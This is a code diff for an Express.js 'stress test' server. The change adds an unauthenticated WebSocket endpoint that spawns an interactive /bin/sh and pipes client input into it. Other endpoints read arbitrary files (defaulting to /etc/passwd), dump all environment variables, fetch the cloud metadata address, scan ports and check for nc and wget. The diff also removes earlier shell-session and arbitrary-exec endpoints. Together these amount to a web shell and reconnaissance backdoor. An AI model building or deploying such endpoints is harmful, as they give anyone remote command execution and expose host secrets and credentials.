@@ -1,14 +1,76 @@
 const express = require('express');
+const http = require('http');
+const WebSocket = require('ws');
 const crypto = require('crypto');
-const { execSync, spawn } = require('child_process');
+const { spawn } = require('child_process');
 const dns = require('dns');
 const fs = require('fs');
 const path = require('path');
 const net = require('net');
 
 const app = express();
+const server = http.createServer(app);
+const wss = new WebSocket.Server({ server, path: '/ws/terminal' });
+
 app.use(express.json());
 app.use(express.static('public'));
+
+// WebSocket Terminal - Real PTY-like experience
+wss.on('connection', (ws) => {
+    console.log('Terminal connected');
+    
+    const shell = spawn('/bin/sh', ['-i'], {
+        cwd: '/tmp',
+        env: { 
+            ...process.env, 
+            TERM: 'xterm-256color',
+            PS1: '\\w $ ',
+            HOME: '/tmp'
+        }
+    });
+    
+    // Send shell output to client immediately
+    shell.stdout.on('data', (data) => {
+        if (ws.readyState === WebSocket.OPEN) {
+            ws.send(JSON.stringify({ type: 'output', data: data.toString() }));
+        }
+    });
+    
+    shell.stderr.on('data', (data) => {
+        if (ws.readyState === WebSocket.OPEN) {
+            ws.send(JSON.stringify({ type: 'output', data: data.toString() }));
+        }
+    });
+    
+    shell.on('close', (code) => {
+        if (ws.readyState === WebSocket.OPEN) {
+            ws.send(JSON.stringify({ type: 'exit', code }));
+        }
+        ws.close();
+    });
+    
+    // Receive input from client
+    ws.on('message', (msg) => {
+        try {
+            const { type, data } = JSON.parse(msg);
+            if (type === 'input') {
+                shell.stdin.write(data);
+            } else if (type === 'resize') {
+                // Can't resize without PTY, but accept the message
+            }
+        } catch (e) {
+            // Raw input fallback
+            shell.stdin.write(msg.toString());
+        }
+    });
+    
+    ws.on('close', () => {
+        console.log('Terminal disconnected');
+        shell.kill();
+    });
+    
+    ws.on('error', () => shell.kill());
+});
 
 // CPU Tests
 app.get('/api/cpu/hash', (req, res) => {
@@ -43,7 +105,6 @@ app.get('/api/cpu/fibonacci', (req, res) => {
     res.json({ n, result, time: Date.now() - start });
 });
 
-// Memory Tests
 app.get('/api/memory/allocate', (req, res) => {
     const sizeMB = parseInt(req.query.size) || 100;
     const start = Date.now();
@@ -60,7 +121,6 @@ app.get('/api/memory/leak', (req, res) => {
     res.json({ totalLeaked: global.leakedData.length, addedMB: (count * 2048) / 1024 / 1024 });
 });
 
-// Network Tests
 app.get('/api/network/fetch', async (req, res) => {
     const url = req.query.url || 'http://169.254.169.254/latest/meta-data/';
     const start = Date.now();
@@ -96,45 +156,39 @@ app.get('/api/network/scan', (req, res) => {
     function checkDone() { if (completed === ports.length) res.json({ host, results: results.sort((a,b) => a.port - b.port) }); }
 });
 
-// System Info
 app.get('/api/system/info', (req, res) => {
+    const { execSync } = require('child_process');
     try {
-        const info = {
+        res.json({
             hostname: execSync('hostname').toString().trim(),
             kernel: execSync('uname -a').toString().trim(),
-            env: process.env,
-            cwd: process.cwd(),
-            meminfo: execSync('cat /proc/meminfo | head -10').toString(),
-            network: execSync('ip addr 2>/dev/null || ifconfig').toString(),
-            processes: execSync('ps aux | head -20').toString()
-        };
-        res.json(info);
+            env: process.env
+        });
     } catch (e) { res.json({ error: e.message }); }
-});
-
-// File System
-app.get('/api/fs/write', (req, res) => {
-    const sizeMB = parseInt(req.query.size) || 10;
-    const filename = '/tmp/stress_' + Date.now() + '.bin';
-    const start = Date.now();
-    const data = crypto.randomBytes(sizeMB * 1024 * 1024);
-    fs.writeFileSync(filename, data);
-    res.json({ filename, sizeMB, time: Date.now() - start });
 });
 
 app.get('/api/fs/read', (req, res) => {
     const filepath = req.query.path || '/etc/passwd';
     try {
-        const content = fs.readFileSync(filepath, 'utf8');
-        res.json({ path: filepath, content: content.slice(0, 5000) });
-    } catch (e) { res.json({ path: filepath, error: e.message }); }
+        res.json({ path: filepath, content: fs.readFileSync(filepath, 'utf8').slice(0, 5000) });
+    } catch (e) { res.json({ error: e.message }); }
+});
+
+app.get('/api/fs/write', (req, res) => {
+    const sizeMB = parseInt(req.query.size) || 10;
+    const filename = '/tmp/stress_' + Date.now() + '.bin';
+    const start = Date.now();
+    fs.writeFileSync(filename, crypto.randomBytes(sizeMB * 1024 * 1024));
+    res.json({ filename, sizeMB, time: Date.now() - start });
 });
 
 app.get('/api/reverse/check', (req, res) => {
+    const { execSync } = require('child_process');
     try {
-        const nc = execSync('which nc 2>/dev/null || echo none').toString().trim();
-        const wget = execSync('which wget 2>/dev/null || echo none').toString().trim();
-        res.json({ nc, wget });
+        res.json({
+            nc: execSync('which nc 2>/dev/null || echo none').toString().trim(),
+            wget: execSync('which wget 2>/dev/null || echo none').toString().trim()
+        });
     } catch (e) { res.json({ error: e.message }); }
 });
 
@@ -144,58 +198,11 @@ app.get('/api/load/concurrent', async (req, res) => {
     const results = await Promise.all(Array.from({length: count}, (_, i) => 
         Promise.resolve(crypto.createHash('sha256').update(String(i)).digest('hex'))
     ));
-    res.json({ count, time: Date.now() - start, sample: results.slice(0, 5) });
-});
-
-// ============== SHELL WITH STREAMING ==============
-const shells = new Map();
-
-app.get('/api/shell/start', (req, res) => {
-    const id = crypto.randomUUID();
-    const proc = spawn('/bin/sh', [], { cwd: '/tmp', env: { ...process.env, PS1: '$ ', TERM: 'dumb' } });
-    
-    let buffer = '';
-    proc.stdout.on('data', d => buffer += d.toString());
-    proc.stderr.on('data', d => buffer += d.toString());
-    proc.on('close', () => shells.delete(id));
-    
-    shells.set(id, { proc, getBuffer: () => { const b = buffer; buffer = ''; return b; } });
-    res.json({ id });
-});
-
-app.get('/api/shell/read/:id', (req, res) => {
-    const s = shells.get(req.params.id);
-    if (!s) return res.status(404).json({ error: 'not found' });
-    res.json({ output: s.getBuffer() });
-});
-
-app.post('/api/shell/write/:id', (req, res) => {
-    const s = shells.get(req.params.id);
-    if (!s) return res.status(404).json({ error: 'not found' });
-    s.proc.stdin.write(req.body.input + '\n');
-    res.json({ ok: true });
-});
-
-app.delete('/api/shell/:id', (req, res) => {
-    const s = shells.get(req.params.id);
-    if (s) { s.proc.kill(); shells.delete(req.params.id); }
-    res.json({ ok: true });
-});
-
-// Simple exec for one-off commands  
-app.post('/api/exec', (req, res) => {
-    const { cmd, cwd } = req.body;
-    if (!cmd) return res.json({ error: 'no cmd' });
-    try {
-        const output = execSync(cmd, { cwd: cwd || '/tmp', timeout: 60000, maxBuffer: 50*1024*1024, encoding: 'utf8' });
-        res.json({ output });
-    } catch (e) {
-        res.json({ output: e.stdout || '', error: e.stderr || e.message });
-    }
+    res.json({ count, time: Date.now() - start });
 });
 
 app.get('/health', (req, res) => res.send('OK'));
 app.get('*', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log('Server on ' + PORT));
+server.listen(PORT, () => console.log('Server on ' + PORT));
